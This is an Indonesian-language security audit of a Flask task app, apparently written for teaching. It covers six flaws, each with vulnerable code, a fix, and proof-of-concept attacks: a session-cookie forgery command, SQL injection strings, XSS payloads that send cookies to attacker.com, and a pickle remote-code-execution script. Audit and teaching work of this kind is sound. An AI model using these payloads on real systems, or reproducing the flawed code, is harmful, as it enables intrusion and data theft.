# Laporan Keamanan Aplikasi – EduTask

**Klasifikasi:** Konfidensial – Hanya untuk keperluan audit & edukasi keamanan  
**Tanggal:** 2024  
**Reviewer:** Tim Security  
**Versi Aplikasi:** 1.0.0  

---

## Ringkasan Eksekutif

Audit keamanan terhadap aplikasi EduTask menemukan **6 celah keamanan** dengan tingkat keparahan yang bervariasi. Celah-celah ini ditemukan di berbagai komponen aplikasi mulai dari lapisan autentikasi, logika akses kontrol, penanganan input pengguna, hingga mekanisme serialisasi data. Aplikasi ini **tidak aman untuk digunakan di lingkungan produksi** sebelum dilakukan perbaikan menyeluruh.

---

## Tabel Ringkasan Celah

| # | ID | Nama Celah | Lokasi | Tingkat Keparahan | CVSS (estimasi) |
|---|---|---|---|---|---|
| 1 | VULN-01 | Kata Sandi Tersimpan dalam Plaintext & Secret Key Lemah | `app.py` – fungsi register, inisialisasi | **Tinggi** | 7.5 |
| 2 | VULN-02 | SQL Injection | `app.py` – route `/login`, `/search` | **Kritis** | 9.8 |
| 3 | VULN-03 | Insecure Direct Object Reference (IDOR) | `app.py` – route task & note | **Tinggi** | 8.1 |
| 4 | VULN-04 | Cross-Site Scripting (XSS) – Reflected & Stored | `app.py` + template search/profile | **Tinggi** | 7.4 |
| 5 | VULN-05 | Broken Access Control (BAC) | `app.py` – route `/admin`, `/api/users` | **Kritis** | 9.1 |
| 6 | VULN-06 | Insecure Deserialization | `app.py` – route `/preferences` | **Kritis** | 9.8 |

---

## Detail Celah Keamanan

---

### VULN-01 · Kata Sandi Plaintext & Secret Key Lemah

**Kategori:** Cryptographic Failures (OWASP A02:2021)  
**Tingkat Keparahan:** Tinggi  
**Komponen:** `app.py`

#### Deskripsi

Aplikasi menyimpan kata sandi pengguna dalam format teks biasa (plaintext) langsung ke database tanpa proses hashing. Selain itu, `secret_key` Flask yang digunakan untuk menandatangani session cookie sangat lemah dan hardcoded di dalam source code.

#### Lokasi Kode Rentan

```python
# app.py baris ~8
app.secret_key = "edutask2024"   # ← Secret key hardcoded & lemah

# app.py – fungsi register
db.execute(
    "INSERT INTO users (username, password) VALUES (?, ?)",
    (username, password),   # ← Password disimpan tanpa hashing
)
```

#### Dampak

- Jika database bocor/diakses penyerang, seluruh kata sandi pengguna langsung terbaca.
- Secret key yang lemah dan dapat ditebak memungkinkan penyerang memalsukan cookie session, sehingga bisa menyamar sebagai pengguna mana pun — termasuk admin — tanpa perlu mengetahui kata sandi.

#### Bukti Eksploitasi

```bash
# Membaca password langsung dari database
sqlite3 instance/edutask.db "SELECT username, password FROM users;"
# Output: admin|admin123
#         student1|password1

# Memalsukan session cookie dengan secret key yang diketahui
# menggunakan flask-unsign atau tool serupa:
flask-unsign --sign --cookie "{'user_id': 1, 'username': 'admin', 'role': 'admin'}" --secret 'edutask2024'
```

#### Rekomendasi Perbaikan

```python
from werkzeug.security import generate_password_hash, check_password_hash
import secrets

# Secret key yang kuat dan acak
app.secret_key = secrets.token_hex(32)

# Saat registrasi – hash password sebelum disimpan
hashed = generate_password_hash(password, method='pbkdf2:sha256', salt_length=16)
db.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, hashed))

# Saat login – verifikasi hash
if user and check_password_hash(user["password"], password):
    # login berhasil
```

---

### VULN-02 · SQL Injection

**Kategori:** Injection (OWASP A03:2021)  
**Tingkat Keparahan:** Kritis  
**Komponen:** `app.py` – route `/login` dan `/search`

#### Deskripsi

Aplikasi membangun query SQL dengan cara menggabungkan langsung (string interpolation) input dari pengguna ke dalam query. Hal ini memungkinkan penyerang menyisipkan perintah SQL arbitrer yang dieksekusi oleh database.

#### Lokasi Kode Rentan

```python
# Route /login
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
db.execute(query)

# Route /search
sql = f"SELECT * FROM tasks WHERE user_id={session['user_id']} AND title LIKE '%{query}%'"
db.execute(sql)
```

#### Dampak

- **Authentication Bypass:** Penyerang dapat login tanpa kata sandi yang valid.
- **Data Exfiltration:** Seluruh isi database dapat dibaca menggunakan teknik UNION-based injection.
- **Data Manipulation:** Penyerang dapat mengubah atau menghapus data.

#### Bukti Eksploitasi

**Bypass Login (Authentication Bypass):**

```
Username: admin'--
Password: (kosong)
```

Query yang terbentuk:
```sql
SELECT * FROM users WHERE username='admin'--' AND password=''
-- Bagian setelah -- diabaikan sebagai komentar SQL
-- Query efektif: SELECT * FROM users WHERE username='admin'
```

**UNION-based Injection di Search:**

```
?q=' UNION SELECT id,username,password,role,bio FROM users--
```

Query yang terbentuk:
```sql
SELECT * FROM tasks WHERE user_id=1 AND title LIKE '%'
UNION SELECT id,username,password,role,bio FROM users--%'
-- Mengembalikan seluruh data tabel users
```

#### Rekomendasi Perbaikan

```python
# Selalu gunakan parameterized query (prepared statement)
user = db.execute(
    "SELECT * FROM users WHERE username=? AND password=?",
    (username, hashed_password)
).fetchone()

# Search dengan parameter
results = db.execute(
    "SELECT * FROM tasks WHERE user_id=? AND title LIKE ?",
    (session["user_id"], f"%{query}%")
).fetchall()
```

---

### VULN-03 · Insecure Direct Object Reference (IDOR)

**Kategori:** Broken Access Control (OWASP A01:2021)  
**Tingkat Keparahan:** Tinggi  
**Komponen:** `app.py` – route edit/delete task dan note

#### Deskripsi

Endpoint untuk mengedit, menghapus tugas, dan melihat/menghapus catatan tidak memverifikasi apakah resource yang diminta benar-benar milik pengguna yang sedang login. Penyerang hanya perlu mengubah angka ID di URL untuk mengakses atau memodifikasi data milik pengguna lain.

#### Lokasi Kode Rentan

```python
# /tasks/edit/<task_id> – tidak ada pengecekan user_id
task = db.execute("SELECT * FROM tasks WHERE id=?", (task_id,)).fetchone()
# Tidak ada: if task["user_id"] != session["user_id"]: abort(403)

# /tasks/delete/<task_id>
db.execute("DELETE FROM tasks WHERE id=?", (task_id,))
# Tidak ada validasi kepemilikan

# /notes/view/<note_id>
note = db.execute("SELECT * FROM notes WHERE id=?", (note_id,)).fetchone()
# Sama – tidak ada pengecekan user_id
```

#### Dampak

- Pengguna A dapat membaca catatan pribadi pengguna B hanya dengan mengganti ID di URL.
- Pengguna A dapat menghapus semua tugas dan catatan milik pengguna lain.
- Pengguna A dapat mengubah isi tugas milik pengguna lain.

#### Bukti Eksploitasi

```
# Login sebagai student1, lalu akses/hapus tugas milik admin:
GET /tasks/edit/1         # Tugas milik admin
GET /tasks/delete/1       # Hapus tugas milik admin
GET /notes/view/1         # Baca catatan milik admin
GET /notes/delete/1       # Hapus catatan milik admin
```

#### Rekomendasi Perbaikan

```python
@app.route("/tasks/edit/<int:task_id>", methods=["GET", "POST"])
def edit_task(task_id):
    db = get_db()
    task = db.execute(
        "SELECT * FROM tasks WHERE id=? AND user_id=?",  # ← tambahkan AND user_id=?
        (task_id, session["user_id"])
    ).fetchone()
    if not task:
        abort(403)  # Forbidden – bukan milik pengguna ini
    # ... lanjutkan logika
```

---

### VULN-04 · Cross-Site Scripting (XSS) – Reflected & Stored

**Kategori:** Injection (OWASP A03:2021)  
**Tingkat Keparahan:** Tinggi  
**Komponen:** `templates/search.html`, `templates/profile.html`

#### Deskripsi

Aplikasi merender input dari pengguna langsung ke HTML menggunakan filter `|safe` Jinja2, yang menonaktifkan auto-escaping. Terdapat dua jenis XSS:

- **Reflected XSS:** Parameter pencarian `?q=` dirender langsung di halaman hasil.
- **Stored XSS:** Kolom `bio` profil pengguna disimpan ke database tanpa sanitasi, lalu dirender tanpa escaping di halaman profil.

#### Lokasi Kode Rentan

```html
<!-- search.html -->
Menampilkan hasil untuk: <strong>{{ query|safe }}</strong>
                                          ↑ |safe menonaktifkan escaping

<!-- profile.html -->
<div class="profile-bio-display">
    {{ user.bio|safe }}
    ↑ Bio dari database dirender mentah
</div>
```

#### Dampak

- **Session Hijacking:** Penyerang dapat mencuri cookie session korban.
- **Phishing:** Mengubah tampilan halaman untuk mengelabui pengguna.
- **Keylogging/Data Theft:** Menyisipkan skrip yang merekam ketikan pengguna.
- **Stored XSS** lebih berbahaya karena menyerang setiap pengguna yang melihat profil tersebut.

#### Bukti Eksploitasi

**Reflected XSS (URL dapat dikirim sebagai link ke korban):**

```
GET /search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**Stored XSS (diisi di form bio profil):**

```html
<script>
  fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

Setelah disimpan, setiap orang yang membuka halaman profil akan menjalankan skrip tersebut.

#### Rekomendasi Perbaikan

```python
# 1. JANGAN gunakan |safe untuk input pengguna – hapus filter tersebut
# Jinja2 auto-escape sudah aktif secara default, cukup gunakan:
{{ query }}          # bukan {{ query|safe }}
{{ user.bio }}       # bukan {{ user.bio|safe }}

# 2. Sanitasi input di sisi server sebelum disimpan
import html
bio_safe = html.escape(request.form.get("bio", ""))

# 3. Implementasikan Content Security Policy (CSP) header
@app.after_request
def set_csp(response):
    response.headers["Content-Security-Policy"] = "default-src 'self'"
    return response
```

---

### VULN-05 · Broken Access Control – Admin Panel & API Terbuka

**Kategori:** Broken Access Control (OWASP A01:2021)  
**Tingkat Keparahan:** Kritis  
**Komponen:** `app.py` – route `/admin`, `/admin/delete_user/<id>`, `/api/users`

#### Deskripsi

Terdapat dua masalah kontrol akses:

1. **Panel admin** hanya memverifikasi apakah pengguna sedang login, tanpa memeriksa apakah role-nya `admin`. Setiap pengguna terdaftar dapat mengakses panel admin.

2. **Endpoint `/api/users`** tidak memerlukan autentikasi sama sekali — siapa pun di internet dapat mengambil daftar username dan role semua pengguna.

#### Lokasi Kode Rentan

```python
@app.route("/admin")
def admin():
    if "user_id" not in session:   # ← Hanya cek login, TIDAK cek role
        return redirect(url_for("login"))
    # Langsung menampilkan data semua pengguna

@app.route("/api/users")
def api_users():
    # TIDAK ADA pengecekan autentikasi sama sekali
    rows = db.execute("SELECT id,username,role FROM users").fetchall()
    return jsonify([dict(r) for r in rows])
```

#### Dampak

- Pengguna biasa (`student`) dapat mengakses panel admin dan menghapus akun pengguna lain.
- Penyerang dapat mengambil daftar username tanpa login sama sekali via `/api/users`.
- Informasi username dapat digunakan sebagai basis serangan brute force atau social engineering.

#### Bukti Eksploitasi

```bash
# Akses admin panel sebagai student biasa
# Login sebagai student1, lalu kunjungi:
GET /admin                          # Berhasil → tampil semua data
GET /admin/delete_user/1            # Hapus akun admin!

# Ambil semua username tanpa login
curl http://localhost:5000/api/users
# Output: [{"id":1,"role":"admin","username":"admin"},
#          {"id":2,"role":"student","username":"student1"}]
```

#### Rekomendasi Perbaikan

```python
from functools import wraps

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            return redirect(url_for("login"))
        if session.get("role") != "admin":
            abort(403)
        return f(*args, **kwargs)
    return decorated

@app.route("/admin")
@admin_required          # ← Gunakan decorator
def admin():
    ...

@app.route("/api/users")
def api_users():
    if "user_id" not in session:    # ← Tambahkan autentikasi
        return jsonify({"error": "Unauthorized"}), 401
    if session.get("role") != "admin":
        return jsonify({"error": "Forbidden"}), 403
    ...
```

---

### VULN-06 · Insecure Deserialization

**Kategori:** Software and Data Integrity Failures (OWASP A08:2021)  
**Tingkat Keparahan:** Kritis  
**Komponen:** `app.py` – route `/preferences`

#### Deskripsi

Aplikasi menyimpan preferensi pengguna di cookie menggunakan modul `pickle` Python yang di-encode dengan Base64. Saat halaman preferensi diakses (GET maupun POST), aplikasi melakukan `pickle.loads()` langsung terhadap nilai cookie tanpa validasi integritas apapun. Penyerang dapat membuat cookie berbahaya yang saat di-deserialize akan menjalankan perintah sistem arbitrer.

#### Lokasi Kode Rentan

```python
import pickle, base64

# Di route /preferences (GET dan POST)
raw = request.cookies.get("prefs")
if raw:
    try:
        prefs = pickle.loads(base64.b64decode(raw))  # ← Eksekusi kode arbitrer!
    except Exception:
        pass
```

#### Dampak

- **Remote Code Execution (RCE):** Penyerang dapat mengeksekusi perintah sistem apapun di server.
- Ini merupakan celah paling berbahaya — penyerang bisa mendapatkan full shell access ke server.
- Bisa digunakan untuk exfiltrate data, install backdoor, atau merusak sistem.

#### Bukti Eksploitasi

```python
import pickle, base64, os, requests

# Payload berbahaya: eksekusi perintah di server
class RCEPayload:
    def __reduce__(self):
        # Perintah yang akan dieksekusi di server
        return (os.system, ("id > /tmp/pwned.txt",))

# Buat cookie berbahaya
payload = base64.b64encode(pickle.dumps(RCEPayload())).decode()

# Kirim ke server
cookies = {"prefs": payload}
response = requests.get("http://localhost:5000/preferences", cookies=cookies)
# Server mengeksekusi: id > /tmp/pwned.txt
```

Payload dapat dimodifikasi untuk:
- Membuat reverse shell
- Menghapus semua file
- Mengunduh dan menjalankan malware
- Mengambil file `/etc/shadow` atau kredensial

#### Rekomendasi Perbaikan

```python
import json
from itsdangerous import URLSafeSerializer

# Gunakan JSON (bukan pickle) + tanda tangan kriptografi
serializer = URLSafeSerializer(app.secret_key, salt="prefs")

# Menyimpan preferensi
encoded = serializer.dumps(prefs)
resp.set_cookie("prefs", encoded, httponly=True, samesite="Lax")

# Membaca preferensi
raw = request.cookies.get("prefs")
if raw:
    try:
        prefs = serializer.loads(raw)  # Validasi tanda tangan otomatis
    except Exception:
        prefs = {}  # Gunakan default jika tidak valid
```

**Jangan pernah menggunakan `pickle` untuk data yang berasal dari pengguna/jaringan.**

---

## Matriks Risiko

```
Dampak
  │
K │                    [VULN-06]
R │          [VULN-02] [VULN-05]
I │
T │  [VULN-01] [VULN-03] [VULN-04]
I │
S └─────────────────────────────────── Kemungkinan
       Rendah    Sedang    Tinggi    Sangat Tinggi
```

---

## Rekomendasi Prioritas Perbaikan

| Prioritas | Celah | Alasan |
|---|---|---|
| 🔴 **P1 – Segera** | VULN-06 (Insecure Deserialization) | RCE – penyerang bisa ambil alih server penuh |
| 🔴 **P1 – Segera** | VULN-02 (SQL Injection) | Kebocoran & manipulasi seluruh database |
| 🔴 **P1 – Segera** | VULN-05 (Broken Access Control) | Admin panel terbuka ke semua user |
| 🟠 **P2 – Penting** | VULN-03 (IDOR) | Akses lintas data pengguna |
| 🟠 **P2 – Penting** | VULN-04 (XSS) | Session hijacking & serangan pada pengguna |
| 🟡 **P3 – Perlu** | VULN-01 (Password Plaintext) | Eksposur kredensial jika database bocor |

---

## Referensi

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [Python Pickle Security Warning](https://docs.python.org/3/library/pickle.html)

---

*Laporan ini dibuat untuk keperluan edukasi keamanan siber. Eksploitasi terhadap sistem tanpa izin adalah tindakan ilegal.*
